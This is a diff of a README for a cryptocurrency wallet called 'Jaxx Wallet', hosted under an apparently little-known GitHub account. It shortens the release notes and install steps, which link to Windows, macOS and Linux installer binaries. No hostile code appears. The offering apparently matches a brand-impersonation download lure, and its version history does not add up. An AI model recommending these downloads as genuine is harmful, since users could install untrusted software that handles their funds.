@@ -1,105 +1,67 @@
 [![Latest Release](https://img.shields.io/github/release/dexlose/jax-wallet.svg)](https://github.com/dexlose/jax-wallet/releases)
-[![License: MIT](https://img.shields.io/github/license/dexlose/jax-wallet.svg)](https://github.com/dexlose/jax-wallet?tab=MIT-1-ov-file)
-
+[![License: MIT](https://img.shields.io/github/license/dexlose/jax-wallet.svg)](https://github.com/dexlose/jax-wallet/blob/main/LICENSE)
 
 # Jaxx Wallet
 
-**Jaxx Wallet** is a sleek cryptocurrency wallet with a user-friendly interface. Below you will find the release information for version 1.9.3, along with installation instructions for various operating systems.
+**Jaxx Wallet** is a user-friendly cryptocurrency wallet that supports multiple coins, offers enhanced security, and provides a clean, intuitive interface.
 
 ---
 
-## 🚀 Latest Release Version: **v1.9.3**
+## 🚀 Latest Release
 
+- **Version**: [v1.9.3](https://github.com/dexlose/jax-wallet/releases)
 - **Release Date**: February 18, 2025
-- **Download Links**: 
-  - [Download Latest Release](https://github.com/dexlose/jax-wallet/releases/latest)
 
-## 📦 File Sizes for this Release:
-- **Windows Installer**: 216 MB
-- **macOS DMG**: 89 MB
-- **Linux AppImage**: 95 MB
+> **Note**: All platform-specific download options (Windows, macOS, Linux) can be found on the [Releases](https://github.com/dexlose/jax-wallet/releases) page.
 
 ---
 
-## 📦 Features of this Release:
-- **Multi-Currency Support**: Store and manage multiple cryptocurrencies in one app.
+## 📦 File Sizes for this Release
+- **Windows Installer**: ~216 MB
+- **macOS DMG**: ~89 MB
+- **Linux AppImage**: ~95 MB
+
+---
+
+## 🚀 Key Features
+- **Multi-Currency Support**: Store and manage multiple cryptocurrencies in one place.
 - **Enhanced Security**: Improved encryption and security protocols.
 - **User-Friendly Interface**: Clean design with intuitive navigation.
-- **Cross-Platform Support**: Available for Mac, Windows, and Linux.
+- **Cross-Platform**: Available for Windows, macOS, and Linux.
 
 ---
 
 ## 💻 Installation Guide
 
-To install Jaxx Wallet, follow the instructions for your operating system below:
-
-### 🖥️ **For Windows:**
-
-1. **Download the Windows Installer**:
-   - [Windows Installer (64-bit)](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/jax-setup-1.9.3.exe)
-
-2. **Run the installer**:
-   - Double-click the `.exe` file to launch the setup wizard.
-
-3. **Follow the installation instructions**:
-   - Complete the installation by following the on-screen instructions.
-
-4. **Launch the application**:
-   - Once the installation is complete, you can find **Jaxx Wallet** in your Start menu.
-
----
-
-### 🍏 **For macOS:**
-
-1. **Download the macOS DMG file**:
-   - [macOS DMG](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/JaxWallet-1.9.3.dmg)
-
-2. **Install the application**:
-   - Open the `.dmg` file and drag **Jaxx Wallet** into your Applications folder.
-
-3. **Launch the application**:
-   - Go to your **Applications** folder and double-click on **Jaxx Wallet** to start using it.
-
----
-
-### 🐧 **For Linux:**
-
-1. **Download the Linux AppImage**:
-   - [Linux AppImage](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/Jax.Wallet-1.9.3.AppImage)
-
-2. **Make the AppImage executable**:
-   - Run the following command in your terminal:
-   ```bash
-   chmod +x jaxx-wallet-linux.AppImage
-   ```
-
-3. **Run the application**:
-   - Execute the AppImage:
-   ```bash
-   ./jaxx-wallet-linux.AppImage
-   ```
-
+1. **Download the appropriate installer** from the [Releases](https://github.com/dexlose/jax-wallet/releases) page.
+2. **Install the application** following your operating system’s standard installation process.
+   - **Windows**: Run the downloaded `.exe` file and follow the setup wizard.
+   - **macOS**: Open the `.dmg` file and drag **Jaxx Wallet** into the Applications folder.
+   - **Linux**: Make the `.AppImage` executable and run it.
+3. **Launch Jaxx Wallet** and start managing your cryptocurrencies.
 
 ---
 
 ## 📜 License
 
-This release is licensed under the **MIT License**.
+This project is licensed under the [MIT License](https://github.com/dexlose/jax-wallet/blob/main/LICENSE). 
 
 ---
 
 ## 📅 Changelog
 
 ### **v1.9.3 (February 18, 2025)**
-
-- Initial release with multi-currency support, enhanced security features, and cross-platform support.
+- Initial public release.
+- Multi-currency support.
+- Enhanced security features.
+- Cross-platform compatibility.
 
 ---
 
 ## 💬 Feedback
 
-We value your feedback! If you encounter any issues, please feel free to create an **issue** or submit a **pull request**. Your contributions are highly appreciated.
+We appreciate your feedback! If you encounter any issues or have suggestions, please:
+- **Create an issue** on GitHub, or 
+- **Submit a pull request** if you have a fix or improvement.
 
----
-
-Thank you for using **Jaxx Wallet**! Enjoy managing your cryptocurrencies securely and easily.
+Thank you for using **Jaxx Wallet**! 
